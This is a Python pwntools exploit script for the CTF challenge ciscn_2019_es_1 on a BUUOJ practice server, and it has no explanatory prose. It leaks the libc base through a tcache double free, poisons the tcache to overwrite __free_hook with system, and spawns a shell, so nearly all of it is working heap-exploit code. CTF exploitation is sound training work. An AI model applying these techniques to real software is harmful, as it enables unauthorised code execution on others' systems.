#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/env python
# -*- coding:utf-8 -*-                           
#Author: Squarer
#Time: 2021.01.26 21.15.12
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*

context.arch = 'amd64'

def add(size,name,call):
		sh.sendlineafter('choice:','1')
		sh.sendlineafter("size of compary's name\n",str(size))
		sh.sendlineafter('name:\n',str(name))
		sh.sendlineafter('call:\n',str(call))

def exit():
		sh.sendlineafter('choice:','4')

def delete(index):
		sh.sendlineafter('choice:','3')
		sh.sendlineafter('index:',str(index))

def show(index):
		sh.sendlineafter('choice:','2')
		sh.sendlineafter('index:\n',str(index))

def show_addr(name,addr):
		log.success('The '+str(name)+' Addr:' + str(hex(addr)))


# host = 1.1.1.1
# port = 10000
local = 0
if local:
	context.log_level = 'debug'
	libc=ELF('/glibc/x64/2.27/lib/libc-2.27.so')
	sh = process('./ciscn_2019_es_1')
else:
	context.log_level = 'debug'
	libc=ELF('./libc-2.27.so')
	sh = remote('node3.buuoj.cn',27531)

main_arena_off = [0x3afc40,0x3ebc40]
main_arena_off = {'local':0x3afc40,'remote':0x3ebc40}

def pwn():
	add(0x88,'A'*8,'B'*8)
	add(0x18,'A'*8,'B'*8)
	for x in xrange(8):
		delete(0)
	show(0)
	sh.recvuntil('name:\n')
	libc_addr = u64(sh.recv(6)+'\x00'*2) - 96 - main_arena_off['remote']
	# gadgetL = [0x41612,0x41666,0xdeed2]
	gadgetL = [0x4f2c5,0x4f322,0x10a38c]

	gadget_addr = libc_addr + gadgetL[0]
	malloc_hook = libc_addr + libc.sym['__malloc_hook']
	free_hook = libc_addr + libc.sym['__free_hook']
	system_addr = libc_addr + libc.sym['system']
	show_addr('libc_addr',libc_addr)
	show_addr('system_addr',system_addr)
	show_addr('free_hook',free_hook)
	show_addr('one_gadget',gadget_addr)
	show_addr('malloc_hook',malloc_hook)
	# system_addr = libc_addr + libc.sym['system']
	# show_addr('system',system_addr)
	# gdb.attach(sh,'b*_int_malloc')	
	add(0x40,'','')
	delete(2)
	delete(2)
	add(0x40,p64(free_hook),'C'*8)
	add(0x40,'/bin/sh\x00','')
	add(0x40,p64(system_addr),'')

	delete(4)	

if __name__ == '__main__':
	pwn()
	sh.interactive()

